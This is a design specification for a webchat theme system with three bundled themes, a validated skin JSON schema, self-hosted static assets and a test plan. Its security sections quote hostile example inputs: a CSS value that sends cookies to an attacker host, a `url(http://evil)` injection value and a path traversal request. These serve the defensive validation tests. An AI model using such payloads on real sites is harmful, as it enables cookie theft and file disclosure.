# Webchat Reskin — Bundled Themes Movimento / Aurora / Classic (Design)

**Status:** Accepted — 2026-05-13 (America/New_York)
**Owners:** `garraia-gateway` (webchat HTML/JS/CSS), no backend route changes
**Closes:** novo épico — TBD (criar issue GAR-XXX após approval do plan)
**Related:** `crates/garraia-gateway/src/webchat.html`, `crates/garraia-gateway/src/admin.html`, `/api/skins`, CLAUDE.md regra #6
**Approved approach:** profundidade B (paleta + componentes) com 3 temas bundled, default Movimento, auto-switch via `prefers-color-scheme`
**Process:** produced via `superpowers:brainstorming` skill (9-step checklist, HARD-GATE respected). Brainstorm artifacts em `.superpowers/brainstorm/8361-1778679823/` (worktree-local).

---

## 0. Objective

Reskin do `webchat.html` para um sistema de temas bundled que preserve a UX chat-first existente mas:

1. Adote uma camada de componentes consistente (Bootstrap 5 + AdminLTE 4 + Bootstrap Icons + Animate.css) parametrizada via CSS variables.
2. Bundle 3 temas como presets: **Classic Garra** (preservado), **Aurora** (dark glass/neon), **Movimento** (light editorial serif).
3. Permita ao usuário escolher entre presets ou criar tema próprio derivando de qualquer base, via Skin Editor evoluído.

**Não-objetivos:**

- Não exposes novas features de backend. As 100+ rotas REST/WS existentes não ganham UI nesta entrega. Gaps (memory browser, tasks, files, groups, etc.) ficam para épicos separados.
- Não muda nada em `admin.html`. Reskin é puramente `webchat.html`.
- Não adiciona novos endpoints. `/api/skins` existente carrega a contract nova com schema de variables expandido.
- Não toca routing, auth, RLS, DB ou qualquer camada Rust além de strings de `include_str!`/`include_bytes!` em `garraia-gateway`.

---

## 1. Scope summary

| Camada | Mudança |
|---|---|
| Frontend HTML | Refactor de `webchat.html` para markup AdminLTE 4 + Bootstrap 5 classes (sidebar, navbar, app-content, modal). Eliminar CSS custom redundante que será coberto pelo framework. |
| Frontend CSS | Novo arquivo `webchat-theme.css` com ~30 CSS vars (`--garra-*`) consumidas por toda componente. Themes presets `themes/classic.json`, `themes/aurora.json`, `themes/movimento.json`. |
| Frontend JS | Theme loader (`applyTheme(theme)`), prefers-color-scheme listener, Skin Editor refeito com presets cards + var grid agrupado + live preview. |
| Backend Rust | Em `crates/garraia-gateway/src/`: `static_assets.rs` novo (ou módulo equivalente) servindo Bootstrap/AdminLTE/etc. via `include_bytes!`. `webchat.html` re-embarcado. **Nada além disso.** |
| Schema `/api/skins` | Skin JSON ganha campos `mode: "dark"|"light"`, `fonts: string[]`, `variables: dict<string,string>`. Backward-compat: skins antigos sem `mode` assumem `"dark"`. |

---

## 2. Theme contract (skin JSON v2)

```jsonc
{
  "schema": 2,                          // version pin; v1 legacy skins migrados on-read
  "id": "movimento",                    // slug único, [a-z0-9-]{1,32}
  "name": "Movimento",                  // display name
  "description": "Light editorial — paper cream + ink + red accent",
  "mode": "light",                      // "dark" | "light" — usado pelo auto-switch
  "author": "garraia",                  // free-text, max 64 chars
  "fonts": [                            // Google Fonts families a self-hostar (ver §3.4)
    "Fraunces",
    "DM Sans",
    "JetBrains Mono"
  ],
  "variables": {
    "--garra-bg":            "#ede3d2",
    "--garra-surface":       "#f4ecdc",
    "--garra-ink":           "#1a1614",
    "--garra-ink-soft":      "#2a2420",
    "--garra-muted":         "#7a6f60",
    "--garra-accent":        "#d63d2a",
    "--garra-accent-soft":   "#a82a1c",
    "--garra-success":       "#22c55e",
    "--garra-warning":       "#f59e0b",
    "--garra-danger":        "#fb7185",
    "--garra-rule":          "#1a161422",
    "--garra-radius":        "0",
    "--garra-radius-sm":     "0",
    "--garra-radius-pill":   "999px",
    "--garra-shadow-card":   "0 1px 0 var(--garra-rule)",
    "--garra-font-display":  "'Fraunces', serif",
    "--garra-font-body":     "'DM Sans', sans-serif",
    "--garra-font-mono":     "'JetBrains Mono', monospace",
    "--garra-weight-bold":   "600",
    "--garra-weight-black":  "900",
    "--garra-letter-tight":  "-0.02em",
    "--garra-anim-duration": "850ms"
    // ~30 vars total — schema completo em §2.3
  }
}
```

### 2.1 Variables — schema completo (categorias)

1. **Surface (8 vars)**: `--garra-bg`, `--garra-surface`, `--garra-surface-alt`, `--garra-overlay`, `--garra-border`, `--garra-rule`, `--garra-divider`, `--garra-elevation-1`.
2. **Text (5 vars)**: `--garra-ink`, `--garra-ink-soft`, `--garra-muted`, `--garra-inverse`, `--garra-link`.
3. **Semantic (5 vars)**: `--garra-accent`, `--garra-accent-soft`, `--garra-success`, `--garra-warning`, `--garra-danger`.
4. **Shape (4 vars)**: `--garra-radius`, `--garra-radius-sm`, `--garra-radius-pill`, `--garra-shadow-card`.
5. **Typography (6 vars)**: `--garra-font-display`, `--garra-font-body`, `--garra-font-mono`, `--garra-weight-bold`, `--garra-weight-black`, `--garra-letter-tight`.
6. **Motion (2 vars)**: `--garra-anim-duration`, `--garra-anim-delay`.

Total: **30 vars**. Schema versioned via `"schema": 2` no JSON (skins v1 sem `schema` → migration on read aplica defaults derivados da paleta antiga).

### 2.2 Contract de segurança

- **Apenas CSS variables são aceitas** — não há campo `customCss` ou similar. Garante que tema não pode injetar `background: url(http://attacker.example/leak?cookies=...)` ou regras arbitrárias.
- Validação no backend (`/api/skins` POST handler): chaves do dict `variables` precisam casar `^--garra-[a-z0-9-]{1,32}$`; valores precisam casar com whitelist regex baseada na categoria (cor hex/rgba, número+unit, font-family quoted, etc.).
- Validação no frontend (Skin Editor): mesmo whitelist client-side para feedback imediato, mas server-side é a source of truth.
- Variables fora do schema são silenciosamente ignoradas (forward-compat).

### 2.3 Component class → variable map (extracto)

```css
.btn-garra-primary {
  background: linear-gradient(135deg, var(--garra-accent), var(--garra-accent-soft));
  color: var(--garra-inverse);
  border-radius: var(--garra-radius-pill);
  font-weight: var(--garra-weight-black);
  font-family: var(--garra-font-body);
}

.glass-card {
  background: var(--garra-surface);
  border: 1px solid var(--garra-border);
  border-radius: var(--garra-radius);
  box-shadow: var(--garra-shadow-card);
}

.status-pill {
  background: color-mix(in srgb, var(--garra-success) 12%, transparent);
  color: var(--garra-success);
  border: 1px solid color-mix(in srgb, var(--garra-success) 24%, transparent);
  border-radius: var(--garra-radius-pill);
  font-family: var(--garra-font-mono);
}
```

Trocar de tema = trocar valores das 30 vars no `:root`. Componentes recompõem automaticamente. Zero JS rerender.

---

## 3. Static asset bundling

### 3.1 Onde

Novo módulo `crates/garraia-gateway/src/static_assets.rs` que serve assets via rotas `GET /static/*` (auth não-requerida — assets são públicos, sem PII).

```rust
const BOOTSTRAP_CSS: &[u8] = include_bytes!("../static/bootstrap-5.3.7.min.css");
const ADMINLTE_CSS:  &[u8] = include_bytes!("../static/adminlte-4.0.0-rc4.min.css");
const ANIMATE_CSS:   &[u8] = include_bytes!("../static/animate-4.1.1.min.css");
const BS_ICONS_CSS:  &[u8] = include_bytes!("../static/bootstrap-icons-1.13.1.min.css");
const NORMALIZE_CSS: &[u8] = include_bytes!("../static/normalize-8.0.1.min.css");
// fonts: WOFF2 self-hosted
// JS: bootstrap.bundle.min.js, adminlte.min.js
```

Path layout em `crates/garraia-gateway/static/`:

```
static/
├── bootstrap-5.3.7.min.css
├── bootstrap-5.3.7.bundle.min.js
├── adminlte-4.0.0-rc4.min.css
├── adminlte-4.0.0-rc4.min.js
├── animate-4.1.1.min.css
├── normalize-8.0.1.min.css
├── bootstrap-icons-1.13.1.min.css
├── bootstrap-icons-1.13.1/
│   ├── fonts/bootstrap-icons.woff2
│   └── fonts/bootstrap-icons.woff
└── fonts/
    ├── inter/Inter-Variable.woff2
    ├── fraunces/Fraunces-Variable.woff2
    ├── dm-sans/DMSans-Variable.woff2
    └── jetbrains-mono/JetBrainsMono-Variable.woff2
```

### 3.2 Custo

- Bootstrap minified: ~230 KB
- AdminLTE: ~150 KB
- Animate.css: ~70 KB
- Bootstrap Icons (font + CSS): ~120 KB
- Normalize: ~10 KB
- 4 fontes variable WOFF2: ~400 KB total

**Total embarcado:** ~1 MB. Binário `garra.exe` atual: 54 MB com `--features plugins`. Acréscimo <2%.

### 3.3 Por que não CDN

- Gateway precisa rodar offline em dev/embedded scenarios (ROADMAP fase 4).
- Zero dependência de jsdelivr.net / fonts.googleapis.com / cloudflare.com.
- CSP fica restrito a `self` — mais simples auditar.
- Sem cold-start latency de DNS+TLS pra hosts externos no primeiro paint.

### 3.4 Por que self-host fonts

Carregar de `fonts.googleapis.com` viola o mesmo princípio que CDN CSS + envia o IP do usuário para o Google em cada page load. Self-hosted WOFF2 variable fonts são ~100 KB cada (vs ~3-5 family files de 60 KB no Google Fonts) — net win.

### 3.5 Rota

```
GET /static/{path}
```

Sem auth. `Cache-Control: public, max-age=31536000, immutable` — cache-bust via filename versionado (`bootstrap-5.3.7.min.css`). Atualizar Bootstrap → novo filename (`bootstrap-5.3.8.min.css`) + atualizar `<link href>` no `webchat.html`. **Nunca** sobrescrever filename existente; quebraria cache imediato em browsers que já fizeram fetch. Pode ser preempted por reverse proxy se desplegado atrás de nginx/caddy.

**Path traversal**: handler obrigatoriamente sanitiza `path` rejeitando `..`, `\`, `:`, NUL, paths absolutos, e symlinks (per memória `reference_axum_path_traversal_test_pattern.md` — `..` puro é colapsado, mas combinações com `.` e dois-segmentos encoded precisam de cobertura explícita). Teste em §9.3 cobre isso.

---

## 4. Default theme + auto-switch

### 4.1 Resolução do tema na primeira carga

```js
async function resolveInitialTheme() {
  // 1. URL param ?theme= (override de query)
  const urlTheme = new URLSearchParams(location.search).get("theme");
  if (urlTheme && isKnownTheme(urlTheme)) return urlTheme;

  // 2. Preference salva (server-side via /api/skins/me ou localStorage fallback)
  const saved = await loadUserThemeChoice();
  if (saved) return saved;

  // 3. Auto-switch por prefers-color-scheme
  const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
  return prefersDark ? "aurora" : "movimento";
}
```

### 4.2 Default fixed map

| `prefers-color-scheme` | Default | Razão |
|---|---|---|
| `light` | Movimento | User decision — aprovado em brainstorm. |
| `dark` | Aurora | Counterpart natural — Aurora é o tema dark do bundle. |
| `no-preference` | Movimento | Fallback ao default `light`. |

Classic Garra **nunca** é default automaticamente — é escolha consciente do usuário (via Skin Editor). Garante zero regression visual indesejada pra usuários que abrem pela primeira vez no SO Windows default (light).

### 4.3 Reactive switch

Listener em `prefers-color-scheme` change media query: re-aplica o tema **somente se** o usuário não tem preference saved (i.e., está em modo "follow system"). Se ele clicou explicitamente em Classic/Aurora/Movimento no Skin Editor, ignora o listener.

```js
window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change", async (e) => {
  const saved = await loadUserThemeChoice();
  if (saved) return; // user opted in to a fixed theme — don't override
  applyTheme(e.matches ? "aurora" : "movimento");
});
```

### 4.4 Persistência

- **Authed users**: reusar `/api/skins?owner=me&active=true` filter (sem endpoint novo). O skin marcado `active: true` é o tema corrente. Apply theme = PATCH `active=false` no anterior + PATCH `active=true` no novo, no mesmo request body se possível. Sigla armazenamento exato (coluna no skins row vs nova tabela `user_theme_preferences`) fica como **TBD-1** — investigação obrigatória no writing-plans, mas o contract público estabilizado é `/api/skins?owner=me&active=true`.
- **Unauthed (webchat sem gateway key)**: `localStorage.setItem("garra:active-theme", "movimento")`.
- Both surfaces lidas em `loadUserThemeChoice()`; preferência authed sobrescreve localStorage se ambos existem.

---

## 5. Skin Editor evolution

### 5.1 Top section — Presets

3 cards com mini-preview (igual aos mockups visto no brainstorm):

```
┌─────────────┬─────────────┬─────────────┐
│ Classic     │ Aurora      │ Movimento ✓ │
│ Garra       │ (dark)      │ (light)     │
│ [preview]   │ [preview]   │ [preview]   │
│ Use         │ Use         │ Active      │
└─────────────┴─────────────┴─────────────┘
```

Clique em "Use" → `applyTheme(id)` instantâneo + persiste. Card "Active" tem indicador visual.

### 5.2 Middle section — Var Grid (Derive)

Abaixo dos presets, botão **"Derive new theme from [Movimento ▾]"**. Abre a grid:

```
COLORS
  --garra-bg       [color picker] #ede3d2
  --garra-ink      [color picker] #1a1614
  --garra-accent   [color picker] #d63d2a
  ...

TYPOGRAPHY
  --garra-font-display  [combo] Fraunces, serif
  --garra-font-body     [combo] DM Sans, sans-serif
  ...

SHAPE / MOTION
  --garra-radius        [slider] 0px
  --garra-anim-duration [slider] 850ms
  ...
```

Live preview = each input change does `document.documentElement.style.setProperty(varName, value)`. Zero round-trip, instantâneo. **Não persiste** até clicar "Save as new theme".

### 5.3 Bottom — Save / Export / Import

- **Save as new theme** → modal com `name` + `description`, POST `/api/skins` → tema vira opção custom na top section.
- **Export JSON** → download do JSON v2 (utilizável fora do Garra, share-friendly).
- **Import JSON** → upload, validate schema, save.
- **Delete** (apenas em temas custom owned pelo user, nunca nos 3 bundled).

### 5.4 Reset

Botão "Reset to default" → executa: (1) PATCH `active=false` em todos os skins do user, (2) `localStorage.removeItem("garra:active-theme")`, (3) re-executa `resolveInitialTheme()` em §4.1, que cai no auto-switch por `prefers-color-scheme`. Não deleta nenhum tema custom criado pelo user — apenas tira o "active" flag.

---

## 6. Migration plan

### 6.1 Existing dark CSS → `themes/classic.json`

O CSS atual do `webchat.html` define vars como `--accent: #facc15`, `--bg: #0e1620`, `--text-primary: #ffffff`, etc. (deduzido do screenshot + grep do file).

Mapping para o novo schema:

| Old var | New var | Value |
|---|---|---|
| `--bg-primary` | `--garra-bg` | `#0e1620` |
| `--bg-input` | `--garra-surface` | `#1a2533` |
| `--accent` | `--garra-accent` | `#facc15` |
| `--text-primary` | `--garra-ink` | `#ffffff` |
| `--text-muted` | `--garra-muted` | `#8b95a5` |
| `--border` | `--garra-border` | `#1a2533` |
| `--radius` | `--garra-radius` | `8px` |
| `--font` | `--garra-font-body` | `system-ui, -apple-system, sans-serif` |

Bundle `themes/classic.json` será gerado durante implementation deste mapping + completed com defaults derivados pra vars novas (sem equivalente antigo).

### 6.2 Existing user skins (forward-compat)

Skin JSON v1 (sem campo `mode`/`schema`) lidos por `/api/skins`:

- Frontend tenta detectar com heuristic: `--garra-bg` value > L=50% no HSL → `mode: "light"`, senão `"dark"`.
- Variables conhecidas são mapped via tabela (igual §6.1).
- Variables desconhecidas no v1 são preservadas mas warned na UI (`Skin contains legacy vars: --foo, --bar — not applied`).

Migração não-destrutiva: skin v1 fica em storage até user re-save (vira v2) ou delete.

### 6.3 Webchat HTML migration

Refactor de `webchat.html` em etapas (uma por commit):

1. Add `<link>` tags para bootstrap/adminlte/etc. (do `/static/*`). Removed conflicting custom CSS.
2. Substituir `<nav class="sidebar">` por `<aside class="app-sidebar">` + adminlte classes. Restruture sidebar markup.
3. Substituir `<main class="chat-area">` por `<main class="app-main">` + cards. Bubbles ficam em `.glass-card`.
4. Substituir `<aside class="right-panel">` por sidebar AdminLTE secundária OR sticky aside.
5. Modais `#settings-modal` / `#skin-modal` / `#dynamic-modal` viram Bootstrap modals (`.modal-dialog .modal-content`).
6. JS handlers re-targetados pros novos IDs/classes.

Esses 6 passos podem ser 6 PRs separados (ratchet-friendly) OU 1 PR grande dependendo da preferência no writing-plans.

---

## 7. Responsive + Animate.css policy

### 7.1 Breakpoints

Adopt Bootstrap default breakpoints + Aurora/Movimento `@media (max-width: 767.98px)` rules:

- ≥1200: layout 3-column completo (sidebar + chat + right panel)
- 992-1199: sidebar collapsible (toggle via hamburger), right panel collapsible
- 768-991: chat full-width, sidebar + right panel viram off-canvas drawers
- ≤767: mobile — sidebar drawer, right panel via modal, input fica fixed bottom

### 7.2 Animate.css usage rules

**Onde USAR:**

- Theme switch transition: `animate__fadeIn` 250ms no `<body>` quando `applyTheme()` chamado.
- Modal open: `animate__zoomIn` 220ms no `.modal-dialog`.
- Modal close: `animate__fadeOut` 180ms.
- Empty-state hero — o welcome screen atual que mostra "Welcome to GarraIA. Type a message to get started." em `#chat-messages` quando o array de mensagens da sessão está vazio: `animate__fadeInUp` aplicado **uma vez** no primeiro render do componente, **nunca** ao re-renderizar após delete ou navegação entre sessions.

**Onde NÃO USAR:**

- **Nunca** em mensagens de chat individuais. Streaming token-by-token + entrada de animação seria visualmente ruidoso.
- **Nunca** em status pills (provider connection, gateway status). Pulse-dot já tem CSS animation própria.
- **Nunca** em hover states. Hover deve ser instantâneo (microinteraction principle).
- **Nunca** em automatic recurring loops (background gradient animation, marquee, etc.). Aurora/Movimento têm esses no HTML original — **descartar**.

### 7.3 `prefers-reduced-motion`

Já implementado no Aurora ref CSS (linhas 616-632 do `chatgptv3.html`). Replicar no `webchat-theme.css`:

```css
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: 1ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 1ms !important;
  }
}
```

---

## 8. Body typography rules

Cada tema define `--garra-font-display` (headings, badges, hero text) **separado** de `--garra-font-body` (chat content, paragraphs, sidebar items). Componentes usam um ou outro explicitamente:

| Elemento | Font var |
|---|---|
| Chat bubble content | `--garra-font-body` |
| Section headings, brand text, hero text | `--garra-font-display` |
| Mono labels (status, IDs, code) | `--garra-font-mono` |
| Sidebar nav items | `--garra-font-body` |
| Modal titles | `--garra-font-display` |
| Buttons | `--garra-font-body` (weight: bold/black via `--garra-weight-*`) |

Por tema:

| Tema | display | body | mono |
|---|---|---|---|
| Classic | `system-ui, sans-serif` | `system-ui, sans-serif` | `ui-monospace, monospace` |
| Aurora | `'Inter', sans-serif` (900 wt) | `'Inter', sans-serif` (400 wt) | `ui-monospace, monospace` |
| Movimento | `'Fraunces', serif` (italic) | `'DM Sans', sans-serif` | `'JetBrains Mono', monospace` |

**Garantia crítica**: chat messages nunca usam serif italic. Movimento é sansed para body. Fraunces aparece apenas em headings/badges/empty-states.

---

## 9. Testing strategy

### 9.1 Visual regression (manual)

- Abrir `webchat.html` em cada um dos 3 temas, fazer screenshot da:
  1. Welcome state (sem mensagens)
  2. Conversa ativa com 5 turnos
  3. Skin Editor aberto
  4. Mobile view (DevTools → iPhone 12)
- Salvar em `docs/superpowers/specs/screenshots/2026-05-13-reskin/`.

### 9.2 Playwright (`tests/playwright/`)

Estender suite existente:

```
tests/playwright/webchat-reskin.spec.ts
```

- `test("should default to Movimento on light prefers-color-scheme")` — usa `page.emulateMedia({ colorScheme: 'light' })`.
- `test("should default to Aurora on dark prefers-color-scheme")` — `colorScheme: 'dark'`.
- `test("should apply theme on click without page reload")` — click "Use" no Aurora card, assert `document.documentElement.style.getPropertyValue('--garra-bg')` é `#080b16`.
- `test("should persist theme choice across reloads")` — apply Classic, reload, assert ainda Classic.
- `test("should reject skin POST with invalid var name")` — POST `/api/skins` com `--malicious: "background-image: url(...)"` → 400.

Convenção: usar `data-testid` (memória `reference_ci_concurrency_pattern.md` da convenção GarraRUST).

### 9.3 Rust tests

`crates/garraia-gateway/tests/static_assets.rs`:

- `test_static_route_serves_bootstrap()` — GET `/static/bootstrap-5.3.7.min.css` retorna 200 + CSS content-type + content-length > 100KB.
- `test_static_route_rejects_traversal()` — GET `/static/../Cargo.toml` retorna 404 (não 200 — path sanitize obrigatório).

`crates/garraia-gateway/tests/skins_v2.rs`:

- `test_skin_v2_validates_var_names()` — POST com chave `not-a-garra-var` ignorado, chave `--garra-bg` aceita.
- `test_skin_v2_validates_var_values()` — POST com `--garra-bg: "background: url(http://evil)"` retorna 400.
- `test_legacy_v1_skin_still_readable()` — GET de skin existente sem `schema` no JSON retorna 200 com migration heuristic aplicada.

### 9.4 Quality ratchet impact

PR-1 do ratchet é report-only — não bloqueia. Mas o reskin pode mexer em métricas:

- LOC tocado: alto (refactor de webchat.html ~3400 linhas + 1 MB static).
- Test coverage: novo módulo `static_assets.rs` precisa coverage.
- CSS LOC: `webchat-theme.css` novo, +500 linhas estimadas.

Run `bash scripts/quality/collect-metrics.sh` antes e depois; deltas reportados no PR comment.

---

## 10. Sequenciamento / PR slicing

Decisão de slicing fica para writing-plans, mas a recomendação é:

1. **PR-1 (foundation)**: bundle static assets + nova rota `/static/*` + theme JSON schema v2 + 3 bundled themes JSON files. **Sem mexer em `webchat.html`.** Testes Rust de static-assets + skins validation. Risco isolado.
2. **PR-2 (markup refactor)**: refactor `webchat.html` para Bootstrap/AdminLTE classes. Bundled themes carregam, prefer-color-scheme funciona, mas Skin Editor antigo ainda. Test Playwright de theme default + switch.
3. **PR-3 (Skin Editor v2)**: novo Skin Editor com cards de preset + var grid + live preview + import/export. Test Playwright de criar/aplicar/persistir tema custom.
4. **PR-4 (polish)**: visual regression screenshots, animate.css scope cleanup, prefers-reduced-motion, mobile audit.

4 PRs encadeados, cada um menor que ~800 LOC tocado. Cada PR ratchet-friendly e revisável independentemente.

---

## 11. Open questions / TBDs

- **TBD-1** (investigation, not blocking): Storage físico de `active` flag em skins owned por authed user. Pode ser coluna `active BOOLEAN DEFAULT false` na tabela de skins (com índice parcial `WHERE active = true`) OU tabela separada `user_theme_preferences`. Investigar storage atual durante writing-plans; contract público (`/api/skins?owner=me&active=true`) já estabilizado em §4.4.
- **TBD-2** (verification, not blocking): AdminLTE `4.0.0-rc4` é release candidate em 2026-05. Re-verificar status stable durante writing-plans; se ainda RC, pin em `4.0.0-rc4` é aceitável (consistente com AdminLTE shipping de produção em vários projetos comerciais hoje).

**Decididas inline (não-TBD)**:

- **Icon library** = **Bootstrap Icons 1.13.1**. Razão: ambas as referências (`chatgptv3.html` e `claudev3.html`) já usam; consistência com adoção AdminLTE; ~120 KB de overhead aceitável vs custo de port pra lucide/feather.
- **Mobile drawer** = **AdminLTE 4 sidebar offcanvas**. Razão: vamos adotar AdminLTE de qualquer forma; usar componente Bootstrap offcanvas seria 2 sistemas paralelos. Single source.

---

## 12. Security audit gate

Per CLAUDE.md `.claude/commands/quality-babysit.md §Guardrails`: este spec **não toca** security, auth, storage, RLS, secrets ou CI crítico. Single security-adjacent surface é o validador de `--garra-*` vars no `/api/skins` POST. Esse handler já existe (apenas o schema muda).

`security-auditor` agent **dispensado** para este épico. `code-reviewer` ainda obrigatório no PR-1 (camada de static assets é nova, path traversal é potential).

---

**Approved by user:** 2026-05-13 (terminal "ok").
**Next step:** `superpowers:writing-plans` para decompor em tasks executáveis por subagent-driven-development.
